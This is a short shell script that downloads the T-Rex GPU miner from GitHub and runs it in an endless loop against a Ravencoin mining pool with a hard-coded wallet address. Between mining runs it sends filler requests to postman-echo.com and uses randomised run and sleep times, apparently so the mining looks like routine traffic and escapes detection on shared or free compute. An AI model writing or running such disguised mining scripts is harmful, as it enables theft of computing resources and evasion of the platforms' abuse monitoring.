wget https://github.com/trexminer/T-Rex/releases/download/0.17.3/t-rex-0.17.3-linux-cuda10.0.tar.gz
tar -xvf t-rex-0.17.3-linux-cuda10.0.tar.gz
while :
do
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	sleep 2s
	curl --location --request GET 'https://postman-echo.com/get?foo1=bar1&foo2=bar2'
	curl --location --request POST 'https://postman-echo.com/post' \--data-raw 'This is expected to be sent back as part of response body.'
	sleep 2s

	x=$(($RANDOM%15))
	y=20
	z=$(($x+$y))

	a=$(($RANDOM%150))
	b=240
	c=$(($a+$b))

	w=$(($RANDOM%60))
	e=120
	aaram=$(($w+$e))
	timeout -k 5 $c\s  ./t-rex -a kawpow -o stratum+tcp://rvn.cruxpool.com:9999   -u  RQk7zCj7XakGddvhaQkwwCKL6Q8nMUEiHc --no-watchdog 
	sleep $aaram
done
